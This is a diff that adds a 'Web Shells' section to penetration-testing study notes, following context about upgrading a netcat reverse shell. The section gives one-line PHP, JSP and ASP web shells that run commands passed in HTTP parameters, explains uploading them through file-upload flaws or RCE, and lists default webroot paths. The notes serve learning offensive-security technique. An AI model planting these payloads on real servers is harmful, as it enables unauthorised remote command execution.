@@ -94,3 +94,36 @@ www-data@remotehost$ stty rows 67 columns 318
 ```
 
 Once we do that, we should have a `netcat` shell that uses the terminal's full features, just like an SSH connection.
+
+## Web Shells
+This is a web script that accepts commands through HTTP params, executes the command and returns the output. There are two components to using these: Uploading the web shell and executing the shell.
+
+A great benefit of these kind of shells is that they utilise the existing connection that would be allowed through a firewall.
+
+### Writing a web shell
+Web shells tend to be simple one line commands that take a command and execute them on the system. The following examples are all *GET* requests:
+
+**PHP**
+```
+<?php system($_REQUEST["cmd"]); ?>
+```
+
+**JSP**
+```
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+```
+
+**ASP**
+```
+<% eval request("cmd") %>
+```
+
+### Uploading the web shell
+We need to get our web shell script into the web root to be able to execute it. This can either be through a file upload vulnerability, or even an RCE could let us write the file on the target system ourself.
+
+| Web Server | Default Webroot        |
+| ---------- | ---------------------- |
+| Apache     | /var/www/html/         |
+| Nginx      | /usr/local/nginx/html/ |
+| IIS        | c:\inetpub\wwwroot\    |
+| XAMPP      | C:\xampp\htdocs\       |
